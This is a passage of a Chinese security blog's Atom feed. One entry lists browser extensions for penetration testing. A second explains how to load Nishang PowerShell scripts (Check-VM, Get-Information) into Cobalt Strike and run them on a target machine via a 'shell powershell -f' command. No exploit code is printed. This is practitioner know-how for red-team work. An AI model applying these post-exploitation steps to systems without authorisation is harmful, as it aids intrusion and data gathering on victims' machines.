    <content type="html"><![CDATA[<p>渗透测试过程中会使用到很多浏览器插件，</p><h3 id="Chrome"><a href="#Chrome" class="headerlink" title="Chrome"></a>Chrome</h3><h4 id="retirejs"><a href="#retirejs" class="headerlink" title="retirejs"></a>retirejs</h4><p>根据js版本号提供漏洞信息</p><p><a href="https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?utm_source=chrome-ntp-icon</a></p><a id="more"></a><h4 id="Penetration-Testing-Kit"><a href="#Penetration-Testing-Kit" class="headerlink" title="Penetration Testing Kit"></a>Penetration Testing Kit</h4><p>自动监测网站使用的框架版本号，并提供漏洞信息</p><p><a href="https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd?utm_source=chrome-ntp-icon" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/penetration-testing-kit/ojkchikaholjmcnefhjlbohackpeeknd?utm_source=chrome-ntp-icon</a></p><h4 id="Wappalyzeer"><a href="#Wappalyzeer" class="headerlink" title="Wappalyzeer"></a>Wappalyzeer</h4><p>信息收集的插件，可以显示出目标站点的服务器环境用的框架，系统，以及脚本语言等。</p><p><a href="https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=zh-CN</a></p><h4 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h4><p>代理神器</p><p><a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN</a></p><h4 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h4><p>不解释</p><p><a href="https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap</a></p><h4 id="IE-Tab"><a href="#IE-Tab" class="headerlink" title="IE Tab"></a>IE Tab</h4><p>Chrome兼容IE插件</p><p><a href="https://chrome.google.com/webstore/detail/ie-tab/hehijbfgiekmjfkfjpbkbammjbdenadd" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/ie-tab/hehijbfgiekmjfkfjpbkbammjbdenadd</a></p><h4 id="User-Agent-Switcher"><a href="#User-Agent-Switcher" class="headerlink" title="User-Agent Switcher"></a>User-Agent Switcher</h4><p>UA头切换</p><p><a href="https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/user-agent-switcher-for-c/djflhoibgkdhkhhcedjiklpkjnoahfmg</a></p><h4 id="d3coder"><a href="#d3coder" class="headerlink" title="d3coder"></a>d3coder</h4><p>解码工具</p><p><a href="https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/d3coder/gncnbkghencmkfgeepfaonmegemakcol</a></p><h4 id="Cookie-Editor"><a href="#Cookie-Editor" class="headerlink" title="Cookie Editor"></a>Cookie Editor</h4><p>Cookie编辑器</p><p><a href="https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg</a></p><h4 id="IP-Address-and-Domain-Information"><a href="#IP-Address-and-Domain-Information" class="headerlink" title="IP Address and Domain Information"></a>IP Address and Domain Information</h4><p>IP信息</p><p><a href="https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/ip-address-and-domain-inf/lhgkegeccnckoiliokondpaaalbhafoa</a></p><h4 id="hackbar"><a href="#hackbar" class="headerlink" title="hackbar"></a>hackbar</h4><p>不解释</p><p><a href="https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc</a></p><h4 id="Tampermonkey"><a href="#Tampermonkey" class="headerlink" title="Tampermonkey"></a>Tampermonkey</h4><p>油猴脚本</p><p><a href="https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo" target="_blank" rel="noopener">https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo</a></p><h3 id="Firefox"><a href="#Firefox" class="headerlink" title="Firefox"></a>Firefox</h3><h4 id="User-Agent-Switcher-and-Manager"><a href="#User-Agent-Switcher-and-Manager" class="headerlink" title="User-Agent Switcher and Manager"></a>User-Agent Switcher and Manager</h4><p>UA头切换</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/user-agent-string-switcher/?src=search</a></p><h4 id="hackbar-1"><a href="#hackbar-1" class="headerlink" title="hackbar"></a>hackbar</h4><p>不解释</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/hackbar-quantum/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/hackbar-quantum/?src=search</a></p><h4 id="Flagfox"><a href="#Flagfox" class="headerlink" title="Flagfox"></a>Flagfox</h4><p>显示国家图标</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/flagfox/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/flagfox/?src=search</a></p><h4 id="IP-Address-and-Domain-Information-1"><a href="#IP-Address-and-Domain-Information-1" class="headerlink" title="IP Address and Domain Information"></a>IP Address and Domain Information</h4><p>ip信息</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/ip-address-and-domain-info/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/ip-address-and-domain-info/?src=search</a></p><h4 id="Cookie-Quick-Manager"><a href="#Cookie-Quick-Manager" class="headerlink" title="Cookie Quick Manager"></a>Cookie Quick Manager</h4><p>Cookie编辑器</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/cookie-quick-manager/?src=search</a></p><h4 id="retire-js"><a href="#retire-js" class="headerlink" title="retire.js"></a>retire.js</h4><p>根据js版本号提供漏洞信息</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/retire-js/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/retire-js/?src=search</a></p><h4 id="NoScript-Security-Suite"><a href="#NoScript-Security-Suite" class="headerlink" title="NoScript Security Suite"></a>NoScript Security Suite</h4><p>浏览器JS控制器</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/noscript/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/noscript/?src=search</a></p><h4 id="Wappalyzer"><a href="#Wappalyzer" class="headerlink" title="Wappalyzer"></a>Wappalyzer</h4><p>信息收集的插件，可以显示出目标站点的服务器环境用的框架，系统，以及脚本语言等。</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/?src=search</a></p><p>####Tampermonkey</p><p>油猴脚本</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/tampermonkey/?src=search</a></p><p>####Shodan.io</p><p>Shodan</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/shodan_io/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/shodan_io/?src=search</a></p><h4 id="Proxy-SwitchyOmega-1"><a href="#Proxy-SwitchyOmega-1" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h4><p>代理神器</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/switchyomega/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/switchyomega/?src=search</a></p><h4 id="Copyfish"><a href="#Copyfish" class="headerlink" title="Copyfish"></a>Copyfish</h4><p>ocr插件</p><p><a href="https://addons.mozilla.org/en-US/firefox/addon/copyfish-ocr-software/?src=search" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/copyfish-ocr-software/?src=search</a></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.cesafe.com/html/2557.html" target="_blank" rel="noopener">https://www.cesafe.com/html/2557.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;渗透测试过程中会使用到很多浏览器插件，&lt;/p&gt;&lt;h3 id=&quot;Chrome&quot;&gt;&lt;a href=&quot;#Chrome&quot; class=&quot;headerlink&quot; title=&quot;Chrome&quot;&gt;&lt;/a&gt;Chrome&lt;/h3&gt;&lt;h4 id=&quot;retirejs&quot;&gt;&lt;a href=&quot;#retirejs&quot; class=&quot;headerlink&quot; title=&quot;retirejs&quot;&gt;&lt;/a&gt;retirejs&lt;/h4&gt;&lt;p&gt;根据js版本号提供漏洞信息&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?utm_source=chrome-ntp-icon&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://chrome.google.com/webstore/detail/retirejs/moibopkbhjceeedibkbkbchbjnkadmom?utm_source=chrome-ntp-icon&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="Chrome" scheme="https://choge.top/tags/Chrome/"/>
    
  </entry>
  
  <entry>
    <title>Cobaltstrike之Powershell扩展</title>
    <link href="https://choge.top/2020/09/01/Cobaltstrike%E4%B9%8BPowershell%E6%89%A9%E5%B1%95/"/>
    <id>https://choge.top/2020/09/01/Cobaltstrike之Powershell扩展/</id>
    <published>2020-09-01T02:23:21.000Z</published>
    <updated>2020-10-26T03:07:55.735Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要收集Powershell扩展脚本</p><h3 id="收集项目"><a href="#收集项目" class="headerlink" title="收集项目"></a>收集项目</h3><p><a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><p><a href="https://www.anquanke.com/post/id/84896" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84896</a></p><p><a href="https://www.anquanke.com/post/id/84939" target="_blank" rel="noopener">https://www.anquanke.com/post/id/84939</a></p><h3 id="使用例子"><a href="#使用例子" class="headerlink" title="使用例子"></a>使用例子</h3><p>以使用Check-VM.ps1为例，检查是否为虚拟机</p><a id="more"></a><p>项目地址：</p><p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Gather/Check-VM.ps1</a></p><p><code>powershell-import</code>进行导入下载下来的脚本</p><p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151356102.png" alt="image-20200901151356102"></p><p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151451325.png" alt="image-20200901151451325"></p><p>脚本代码</p><p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151638779.png" alt="image-20200901151638779"></p><p>运行Check-VM.ps1脚本函数<code>powershell Check-VM</code></p><p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151721897.png" alt="image-20200901151721897"></p><h3 id="信息收集脚本"><a href="#信息收集脚本" class="headerlink" title="信息收集脚本"></a>信息收集脚本</h3><p>脚本地址</p><p><a href="https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1" target="_blank" rel="noopener">https://github.com/samratashok/nishang/blob/master/Gather/Get-Information.ps1</a></p><p>使用如下</p><p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151936475.png" alt="image-20200901151936475"></p><p><img src="//choge.top/2020/09/01/Cobaltstrike之Powershell扩展/image-20200901151902644.png" alt="image-20200901151902644"></p><p>###上传到目标机运行</p><p>powershell上传到目标机器后执行<code>shell powershell -f  xx.psl</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要收集Powershell扩展脚本&lt;/p&gt;&lt;h3 id=&quot;收集项目&quot;&gt;&lt;a href=&quot;#收集项目&quot; class=&quot;headerlink&quot; title=&quot;收集项目&quot;&gt;&lt;/a&gt;收集项目&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/samratashok/nishang&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/samratashok/nishang&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/84896&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/84896&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/84939&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/84939&lt;/a&gt;&lt;/p&gt;&lt;h3 id=&quot;使用例子&quot;&gt;&lt;a href=&quot;#使用例子&quot; class=&quot;headerlink&quot; title=&quot;使用例子&quot;&gt;&lt;/a&gt;使用例子&lt;/h3&gt;&lt;p&gt;以使用Check-VM.ps1为例，检查是否为虚拟机&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cobalt Strike" scheme="https://choge.top/categories/Cobalt-Strike/"/>
    
    
      <category term="cs" scheme="https://choge.top/tags/cs/"/>
    
  </entry>
  
</feed>
